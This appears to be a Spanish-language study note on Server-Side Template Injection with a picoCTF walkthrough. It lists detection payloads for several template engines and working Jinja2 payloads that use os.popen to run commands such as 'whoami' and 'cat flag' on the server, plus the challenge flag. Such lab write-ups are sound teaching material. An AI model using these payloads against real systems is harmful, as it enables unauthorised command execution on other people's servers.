---
{"dg-publish":true,"permalink":"/bug-bounty/template-injection/server-side-template-injection/"}
---

Server-Side Template Injection (SSTI) es una vulnerabilidad web que ocurre cuando una aplicacion del lado del servidor (server-side) evalua dinamicamente plantillas (templates) con entradas controladas por el usuario sin una validacion adecuada.

# Que es exactamente una plantilla (template)?

Una plantilla es como un molde con partes fijas (como HTML) y espacios para rellenar con datos que el servidor pone.
Por ejemplo imagina este HTML:

```
<h1>Hola {{ nombre }}</h1>
```
El **{{ nombre }}** es una expresion de plantilla, que se reemplaza automaticamente por un valor en el servidor, como:

```
<h1> Hola Cesar </h1>
```

# Como identificar un SSTI
1. Debemos encontrar un punto de inyeccion: un campo de entrada que luego se renderiza en una pagina (por ejemplo: name, message, comment).
2. Prueba con paylodas simples de cada motor de plantillas para ver si se evaluan.
	1. Si te sale el resultado calculado (por ejemplo 4), tienes SSTI.
Aqui tienes una tabla con pyloads de prueba de motores comunes:

| Motor            | Payload de prueba |
| ---------------- | ----------------- |
| Jinja2 (Python)  | {{7*7}}           |
| Twig (PHP)       | {{7*7}}           |
| Velocity (Java)  | #set($x=7*7) $x   |
| Freemaker (java) | ${7*7}            |
| Smarty (PHP)     | {$smarty.version} |

Si la salida es 49 estas ejecutando codigo dentro de la plantilla.

Procederemos a mostrar de que va la vulnerabilidad con un ejercicio de PicoCTF:

![Pasted image 20250716192706.png](/img/user/imgs/Pasted%20image%2020250716192706.png)

Accedemos al link y tenemos la siguiente pagina:

![Pasted image 20250716192734.png](/img/user/imgs/Pasted%20image%2020250716192734.png)

Observando mas de cerca tenemos lo siguiente:

![Pasted image 20250716192758.png](/img/user/imgs/Pasted%20image%2020250716192758.png)

Nos dice que el sitio nos permite anunciar cualquier cosa que queramos.

Probamos con payloads basicos como: **{{7x7}}***

Ahora vemos que nos devuelve el calculo:

![Pasted image 20250716192932.png](/img/user/imgs/Pasted%20image%2020250716192932.png)

Por lo tanto estamos tratando con Server Side Template Injection.

Procedemos a probar algunos paylods para saber mas informacion, debemos buscar variantes ya que puede que haya atributos bloqueados.


```
# Este payload te permite ejecutar un comando en el servidor:
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}


# Otros equivalentes:
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}

{{''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('cat flag.txt').read()}}

```

En este caso me funcion el segundo:

```
# Para saber que usuarios somos
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}

# Ver el contenido
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

# Mostrar la flag correspondiente al reto
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

```

![Pasted image 20250716193353.png](/img/user/imgs/Pasted%20image%2020250716193353.png)

![Pasted image 20250716193418.png](/img/user/imgs/Pasted%20image%2020250716193418.png)

![Pasted image 20250716193440.png](/img/user/imgs/Pasted%20image%2020250716193440.png)

Flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}

